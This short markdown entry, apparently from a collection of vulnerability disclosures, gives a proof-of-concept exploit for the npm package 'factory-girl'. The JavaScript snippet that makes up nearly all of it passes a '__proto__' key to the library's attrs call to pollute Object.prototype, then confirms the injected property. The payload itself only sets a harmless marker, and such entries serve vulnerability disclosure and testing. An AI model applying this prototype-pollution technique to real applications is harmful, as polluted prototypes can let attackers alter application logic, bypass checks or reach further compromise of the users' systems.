# factory-girl

- package name: `factory-girl`

- PoC exploit:

```javascript
var factory = require('factory-girl').default;
var assert = require('assert');
factory.define('Test', {}, {}).attrs({['__proto__']: {polluted: 'yes'}}).then(() => {
   assert(Object.prototype.polluted, 'yes')
   console.log('Polluted!');
})
```